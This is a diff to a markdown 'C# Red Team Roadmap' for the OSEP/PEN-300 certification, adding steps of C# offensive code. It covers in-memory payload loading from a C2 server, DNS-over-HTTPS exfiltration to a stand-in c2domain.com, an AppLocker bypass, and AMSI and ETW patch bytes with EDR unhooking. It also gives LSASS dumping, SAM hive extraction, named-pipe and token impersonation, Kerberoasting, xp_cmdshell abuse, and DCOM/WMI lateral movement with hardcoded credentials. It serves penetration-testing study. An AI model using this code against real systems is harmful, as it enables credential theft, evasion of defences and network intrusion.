@@ -1,3 +1,8 @@
+# C# Red Team Roadmap — OSEP Edition
+> A complete, structured path from C# basics to advanced offensive tooling, fully aligned with PEN-300 / OSEP requirements.
+
+---
+
 ## 🟢 Stage 1 — Language Basics
 > Mandatory. No tool can be written without syntax fundamentals.
 
@@ -394,7 +399,7 @@ static extern bool OpenProcessToken(
     out IntPtr TokenHandle
 );
 
-// TOKEN_QUERY = 0x0008
+// TOKEN_QUERY             = 0x0008
 // TOKEN_ADJUST_PRIVILEGES = 0x0020
 ```
 
@@ -412,7 +417,6 @@ unsafe
     int* ptr = &value;
     Console.WriteLine(*ptr); // → 42
 
-    // Pinning a byte array for shellcode
     fixed (byte* p = shellcode)
     {
         // p is a raw pointer to the byte array
@@ -425,11 +429,9 @@ Converting between managed and unmanaged memory — bridge between C# and Window
 ```csharp
 using System.Runtime.InteropServices;
 
-// Allocate unmanaged memory
 IntPtr ptr = Marshal.AllocHGlobal(shellcode.Length);
 Marshal.Copy(shellcode, 0, ptr, shellcode.Length);
 
-// Copy back to managed
 byte[] buffer = new byte[shellcode.Length];
 Marshal.Copy(ptr, buffer, 0, shellcode.Length);
 
@@ -498,13 +500,10 @@ method.Invoke(null, null);
 ### Step 42 — Assembly.Load() — In-Memory Execution
 Loading a .NET assembly from a byte array — the payload never touches disk.
 ```csharp
-// Download payload bytes from C2
 byte[] asmBytes = await DownloadPayload(c2Url);
 
-// Load assembly entirely in memory
 Assembly asm = Assembly.Load(asmBytes);
 
-// Invoke entry point
 Type type = asm.GetType("Payload.Program");
 MethodInfo run = type.GetMethod("Execute");
 run.Invoke(null, new object[] { args });
@@ -522,12 +521,38 @@ MethodInfo virtualAlloc = kernel32.GetMethod("VirtualAlloc");
 object result = virtualAlloc.Invoke(null, new object[] { ... });
 ```
 
+### Step 44 — PowerShell Runspace (AppLocker Bypass)
+Creating a custom PowerShell runspace from C# to bypass AppLocker and constrained language mode.
+```csharp
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+
+// Create a custom runspace — bypasses AppLocker script rules
+Runspace rs = RunspaceFactory.CreateRunspace();
+rs.Open();
+
+Pipeline pipeline = rs.CreatePipeline();
+pipeline.Commands.AddScript("whoami; hostname; ipconfig");
+pipeline.Commands.Add("Out-String");
+
+var results = pipeline.Invoke();
+foreach (var result in results)
+    Console.WriteLine(result.ToString());
+
+rs.Close();
+
+// Why this works:
+// AppLocker blocks .ps1 files on disk.
+// A runspace executes PowerShell entirely in memory,
+// never writing a script file — AppLocker has no file to evaluate.
+```
+
 ---
 
 ## 🔴 Stage 9 — Networking & C2 Communication
-> Building real C2 channels — HTTP, TCP, DNS.
+> Building real C2 channels — HTTP, TCP, DNS, Named Pipes.
 
-### Step 44 — TCP Client & Server
+### Step 45 — TCP Client & Server
 Raw TCP communication — foundation of reverse shells and C2 channels.
 ```csharp
 // TCP Client (implant side)
@@ -544,7 +569,7 @@ listener.Start();
 TcpClient conn = await listener.AcceptTcpClientAsync();
 ```
 
-### Step 45 — HTTP Beaconing
+### Step 46 — HTTP Beaconing
 HTTP-based C2 communication — blends with normal web traffic.
 ```csharp
 using HttpClient http = new HttpClient();
@@ -561,33 +586,73 @@ int jitter = new Random().Next(1000, 5000);
 await Task.Delay(sleepInterval * 1000 + jitter);
 ```
 
-### Step 46 — DNS over HTTPS (DoH) Beaconing
+### Step 47 — DNS over HTTPS (DoH) Beaconing
 Covert C2 channel via DNS queries — bypasses many network-layer controls.
 ```csharp
-// Encode command output in DNS subdomain
 string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(output))
     .Replace("+", "-").Replace("/", "_").Replace("=", "");
 
 string dnsQuery = $"{encoded}.c2domain.com";
 
-// Query via DoH to avoid local DNS monitoring
 string dohUrl = $"https://1.1.1.1/dns-query?name={dnsQuery}&type=TXT";
 string response = await http.GetStringAsync(dohUrl);
 ```
 
-### Step 47 — Named Pipes
-Lateral movement communication channel — used for inter-process and cross-host C2.
+### Step 48 — Named Pipes & Impersonation
+Lateral movement channel — used for inter-process and cross-host C2.
+Impersonation lets the pipe server steal the connecting client's token.
 ```csharp
 using System.IO.Pipes;
+using System.Runtime.InteropServices;
+
+[DllImport("advapi32.dll")]
+static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
 
 // Server (C2 / operator side)
-using NamedPipeServerStream server = new NamedPipeServerStream("redteam");
+using NamedPipeServerStream server = new NamedPipeServerStream(
+    "redteam", PipeDirection.InOut, 1,
+    PipeTransmissionMode.Byte, PipeOptions.None);
+
 await server.WaitForConnectionAsync();
 
+// Steal the connected client's security token
+ImpersonateNamedPipeClient(server.SafePipeHandle.DangerousGetHandle());
+// Now running under the client's identity
+
 // Client (implant side)
-using NamedPipeClientStream client = new NamedPipeClientStream(".", "redteam",
-    PipeDirection.InOut);
+using NamedPipeClientStream client = new NamedPipeClientStream(
+    ".", "redteam", PipeDirection.InOut);
 await client.ConnectAsync();
+```
+
+### Step 49 — MSSQL Interaction from C#
+Microsoft SQL Server is a common lateral movement and privilege escalation vector.
+`xp_cmdshell` enables OS command execution directly from SQL.
+```csharp
+using System.Data.SqlClient;
+
+string connStr = "Server=10.0.0.5;Database=master;User Id=sa;Password=Password123!;";
+
+using SqlConnection conn = new SqlConnection(connStr);
+conn.Open();
+
+// Enable xp_cmdshell
+string enableCmd = @"
+    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+new SqlCommand(enableCmd, conn).ExecuteNonQuery();
+
+// Execute OS command via SQL
+string query = "EXEC xp_cmdshell 'whoami'";
+using SqlDataReader reader = new SqlCommand(query, conn).ExecuteReader();
+while (reader.Read())
+    Console.WriteLine(reader[0]?.ToString());
+
+// Linked server enumeration — jump to another SQL server
+string linkedQuery = "SELECT name FROM sys.servers WHERE is_linked = 1";
+using SqlDataReader lr = new SqlCommand(linkedQuery, conn).ExecuteReader();
+while (lr.Read())
+    Console.WriteLine($"[Linked] {lr["name"]}");
 ```
 
 ---
@@ -595,12 +660,9 @@ await client.ConnectAsync();
 ## 🟤 Stage 10 — AV / EDR Evasion
 > Techniques to bypass security controls — detection evasion, hook circumvention.
 
-### Step 48 — AMSI Bypass
+### Step 50 — AMSI Bypass
 Patching the Anti-Malware Scan Interface in memory to prevent script scanning.
 ```csharp
-// AMSI scans managed code at runtime
-// Patching AmsiScanBuffer() to always return AMSI_RESULT_CLEAN
-
 [DllImport("kernel32")]
 static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
@@ -612,20 +674,23 @@ static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
     uint flNewProtect, out uint lpflOldProtect);
 
 // Concept: find AmsiScanBuffer → patch first bytes → return clean
+// AmsiScanBuffer patch (returns AMSI_RESULT_CLEAN = 1):
+// byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 ```
 
-### Step 49 — ETW Patching
+### Step 51 — ETW Patching
 Disabling Event Tracing for Windows to blind EDR telemetry collection.
 ```csharp
-// ETW is used by EDRs to collect runtime telemetry
-// EtwEventWrite() in ntdll.dll can be patched to suppress events
+// ETW is used by EDRs to collect runtime telemetry.
+// EtwEventWrite() in ntdll.dll can be patched to suppress events.
 
 // Same pattern as AMSI:
 // LoadLibrary("ntdll.dll") → GetProcAddress("EtwEventWrite")
 // → VirtualProtect(RW) → patch bytes → VirtualProtect(restore)
+// Patch: { 0xC3 } — ret instruction, function returns immediately
 ```
 
-### Step 50 — Unhooking via Fresh NTDLL
+### Step 52 — Unhooking via Fresh NTDLL
 EDRs hook ntdll.dll functions. Loading a fresh copy from disk bypasses their hooks.
 ```csharp
 // EDR hook flow:
@@ -636,9 +701,12 @@ EDRs hook ntdll.dll functions. Loading a fresh copy from disk bypasses their hoo
 // 2. Map it manually into memory
 // 3. Overwrite the hooked .text section with the clean version
 // 4. Your code now calls unhooked syscalls directly
+
+byte[] freshNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
+// Parse PE headers → locate .text section → overwrite in-process ntdll
 ```
 
-### Step 51 — Direct Syscalls
+### Step 53 — Direct Syscalls
 Bypassing EDR userland hooks by invoking syscalls directly without going through ntdll.
 ```csharp
 // Standard API call (hookable):
@@ -655,7 +723,7 @@ Bypassing EDR userland hooks by invoking syscalls directly without going through
 // ret
 ```
 
-### Step 52 — Payload Obfuscation
+### Step 54 — Payload Obfuscation
 Hiding shellcode from static AV signatures — encryption and encoding at rest.
 ```csharp
 // XOR encrypt shellcode before embedding
@@ -673,7 +741,7 @@ ICryptoTransform decryptor = aes.CreateDecryptor();
 byte[] plain = decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
 ```
 
-### Step 53 — Process Injection — Classic
+### Step 55 — Process Injection — Classic
 Injecting shellcode into a remote process — the foundation of most post-exploitation.
 ```csharp
 // Classic injection flow:
@@ -693,7 +761,7 @@ static extern IntPtr CreateRemoteThread(IntPtr hProcess,
     uint dwCreationFlags, out uint lpThreadId);
 ```
 
-### Step 54 — Process Hollowing
+### Step 56 — Process Hollowing
 Creating a suspended process, replacing its memory with a payload, then resuming.
 ```csharp
 // Process hollowing flow:
@@ -711,6 +779,237 @@ static extern bool CreateProcess(string lpApplicationName,
     uint dwCreationFlags, IntPtr lpEnvironment,
     string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
     out PROCESS_INFORMATION lpProcessInformation);
+```
+
+---
+
+## 🟣 Stage 11 — Credential Access
+> Dumping and abusing Windows credentials — the core of post-exploitation.
+
+### Step 57 — Token Impersonation
+Stealing and impersonating Windows security tokens from privileged processes.
+```csharp
+[DllImport("advapi32.dll")]
+static extern bool OpenProcessToken(IntPtr hProcess, uint dwAccess, out IntPtr hToken);
+
+[DllImport("advapi32.dll")]
+static extern bool DuplicateTokenEx(IntPtr hToken, uint dwAccess,
+    IntPtr lpTokenAttr, int impersonationLevel,
+    int tokenType, out IntPtr phNewToken);
+
+[DllImport("advapi32.dll")]
+static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+// TOKEN_ALL_ACCESS = 0xF01FF
+// Flow: OpenProcess → OpenProcessToken → DuplicateTokenEx → ImpersonateLoggedOnUser
+// Impersonate SYSTEM by targeting a SYSTEM-owned process (e.g., winlogon.exe)
+```
+
+### Step 58 — Custom MiniDump (LSASS)
+Writing a custom `MiniDumpWriteDump` implementation to dump LSASS memory and avoid AV signatures on the standard API call pattern.
+```csharp
+[DllImport("dbghelp.dll")]
+static extern bool MiniDumpWriteDump(
+    IntPtr hProcess,
+    uint ProcessId,
+    IntPtr hFile,
+    uint DumpType,           // MiniDumpWithFullMemory = 2
+    IntPtr ExceptionParam,
+    IntPtr UserStreamParam,
+    IntPtr CallbackParam
+);
+
+// Standard approach (flagged by most AVs):
+Process lsass = Process.GetProcessesByName("lsass")[0];
+IntPtr hProcess = OpenProcess(0x1F0FFF, false, lsass.Id);
+using FileStream fs = new FileStream("lsass.dmp", FileMode.Create);
+MiniDumpWriteDump(hProcess, (uint)lsass.Id,
+    fs.SafeFileHandle.DangerousGetHandle(), 2,
+    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+
+// Evasion: use a custom callback or snapshot approach,
+// or read LSASS memory manually via ReadProcessMemory
+// to reconstruct the dump without calling MiniDumpWriteDump directly.
+```
+
+### Step 59 — SAM & Registry Credential Extraction
+Reading SAM hive and SYSTEM hive to extract local account NTLM hashes offline.
+```csharp
+// SAM hives are locked at runtime — use Volume Shadow Copy or reg save
+// reg save HKLM\SAM   C:\Temp\sam.hive
+// reg save HKLM\SYSTEM C:\Temp\system.hive
+
+// From C#: invoke reg save via Process.Start or via P/Invoke to RegSaveKey
+[DllImport("advapi32.dll")]
+static extern int RegOpenKeyEx(IntPtr hKey, string subKey,
+    int options, int samDesired, out IntPtr phkResult);
+
+[DllImport("advapi32.dll")]
+static extern int RegSaveKey(IntPtr hKey, string lpFile, IntPtr secAttr);
+
+// HKEY_LOCAL_MACHINE = 0x80000002
+// Then parse hive offline with tools like impacket's secretsdump
+// or implement SYSKEY decryption manually in C#
+```
+
+### Step 60 — Kerberos Ticket Manipulation
+Requesting, listing, and injecting Kerberos tickets — foundation of Pass-the-Ticket and Kerberoasting.
+```csharp
+// C# Kerberos operations rely on SSPI (Security Support Provider Interface)
+// or direct calls to LSA (Local Security Authority)
+
+[DllImport("secur32.dll")]
+static extern int LsaConnectUntrusted(out IntPtr LsaHandle);
+
+[DllImport("secur32.dll")]
+static extern int LsaCallAuthenticationPackage(
+    IntPtr LsaHandle, uint AuthenticationPackage,
+    IntPtr ProtocolSubmitBuffer, uint SubmitBufferLength,
+    out IntPtr ProtocolReturnBuffer, out uint ReturnBufferLength,
+    out int ProtocolStatus);
+
+// Key operations:
+// KERB_RETRIEVE_TKT_REQUEST  → extract TGT/TGS from memory
+// KERB_SUBMIT_TKT_REQUEST    → inject a forged/stolen ticket (Pass-the-Ticket)
+// KERB_PURGE_TKT_CACHE_REQUEST → clear tickets
+
+// In practice: use Rubeus source as reference for LSA ticket operations
+```
+
+---
+
+## 🔵 Stage 12 — Active Directory Exploitation
+> Enumerating and attacking AD from C# — LDAP queries, ACL abuses, lateral movement.
+
+### Step 61 — LDAP Enumeration
+Querying Active Directory via LDAP to enumerate users, groups, SPNs, and DACLs.
+```csharp
+using System.DirectoryServices;
+
+// Connect to the domain
+DirectoryEntry entry = new DirectoryEntry("LDAP://DC=corp,DC=local");
+DirectorySearcher searcher = new DirectorySearcher(entry);
+
+// Enumerate all users
+searcher.Filter = "(&(objectClass=user)(objectCategory=person))";
+searcher.PropertiesToLoad.Add("samaccountname");
+searcher.PropertiesToLoad.Add("memberof");
+searcher.PropertiesToLoad.Add("servicePrincipalName");
+
+foreach (SearchResult result in searcher.FindAll())
+{
+    string username = result.Properties["samaccountname"][0].ToString();
+    Console.WriteLine($"[User] {username}");
+
+    // SPN present = Kerberoastable account
+    if (result.Properties.Contains("servicePrincipalName"))
+        Console.WriteLine($"  [!] Kerberoastable: {username}");
+}
+```
+
+### Step 62 — Kerberoasting
+Requesting service tickets for SPN accounts and extracting them for offline cracking.
+```csharp
+using System.IdentityModel.Tokens;
+
+// Find Kerberoastable accounts (SPN set, not krbtgt)
+searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*)" +
+                  "(!samaccountname=krbtgt))";
+searcher.PropertiesToLoad.Add("servicePrincipalName");
+searcher.PropertiesToLoad.Add("samaccountname");
+
+foreach (SearchResult result in searcher.FindAll())
+{
+    string spn = result.Properties["servicePrincipalName"][0].ToString();
+    Console.WriteLine($"[*] Requesting TGS for: {spn}");
+
+    // Request TGS — Windows automatically fetches it when you access the SPN
+    // The ticket is RC4 or AES encrypted with the service account's password hash
+    KerberosRequestorSecurityToken token =
+        new KerberosRequestorSecurityToken(spn);
+
+    // Extract the raw ticket bytes for offline cracking (hashcat -m 13100)
+    byte[] ticket = token.GetRequest();
+    Console.WriteLine(Convert.ToBase64String(ticket));
+}
+```
+
+### Step 63 — DACL / ACL Enumeration
+Reading discretionary ACLs on AD objects to find privilege escalation paths (WriteDACL, GenericAll, GenericWrite, etc.).
+```csharp
+using System.DirectoryServices;
+using System.Security.AccessControl;
+
+DirectoryEntry target = new DirectoryEntry("LDAP://CN=Domain Admins,CN=Users,DC=corp,DC=local");
+ActiveDirectorySecurity security = target.ObjectSecurity;
+
+foreach (ActiveDirectoryAccessRule rule in security.GetAccessRules(
+    true, true, typeof(System.Security.Principal.NTAccount)))
+{
+    Console.WriteLine($"Principal : {rule.IdentityReference}");
+    Console.WriteLine($"Rights    : {rule.ActiveDirectoryRights}");
+    Console.WriteLine($"Type      : {rule.AccessControlType}");
+    Console.WriteLine();
+
+    // Dangerous rights to look for:
+    // GenericAll, GenericWrite, WriteDACL, WriteOwner, AllExtendedRights
+}
+```
+
+### Step 64 — COM Object Lateral Movement
+Using COM objects from C# for fileless lateral movement to remote hosts.
+```csharp
+using System.Runtime.InteropServices;
+
+// MMC20.Application COM object — executes commands on a remote host
+// Requires DCOM access (port 135) and local admin on target
+
+Type comType = Type.GetTypeFromProgID("MMC20.Application", "10.0.0.5");
+object mmc   = Activator.CreateInstance(comType);
+
+// Navigate to the View.ExecuteShellCommand method via reflection
+object doc    = comType.InvokeMember("Document",
+    BindingFlags.GetProperty, null, mmc, null);
+object view   = doc.GetType().InvokeMember("ActiveView",
+    BindingFlags.GetProperty, null, doc, null);
+
+view.GetType().InvokeMember("ExecuteShellCommand",
+    BindingFlags.InvokeMethod, null, view,
+    new object[] { "cmd.exe", null, "/c whoami > C:\\Temp\\out.txt", "7" });
+
+// Other COM objects usable for lateral movement:
+// ShellWindows    (CLSID: 9BA05972-F6A8-11CF-A442-00A0C90A8F39)
+// ShellBrowserWindow (CLSID: C08AFD90-F2A1-11D1-8455-00A0C91F3880)
+```
+
+### Step 65 — WMI Lateral Movement
+Using WMI from C# to execute commands on remote hosts — a classic living-off-the-land technique.
+```csharp
+using System.Management;
+
+// Connect to remote WMI service
+ConnectionOptions options = new ConnectionOptions
+{
+    Username = "CORP\\Administrator",
+    Password  = "Password123!",
+    Impersonation = ImpersonationLevel.Impersonate,
+    Authentication = AuthenticationLevel.PacketPrivacy
+};
+
+ManagementScope scope = new ManagementScope(
+    $"\\\\10.0.0.5\\root\\cimv2", options);
+scope.Connect();
+
+// Execute a command via Win32_Process.Create
+ObjectGetOptions objGetOptions = new ObjectGetOptions();
+ManagementPath managementPath = new ManagementPath("Win32_Process");
+ManagementClass processClass   = new ManagementClass(scope, managementPath, objGetOptions);
+
+ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
+inParams["CommandLine"] = "cmd.exe /c whoami > C:\\Temp\\out.txt";
+
+ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
+Console.WriteLine($"[*] Process created with PID: {outParams["ProcessId"]}");
 ```
 
 ---
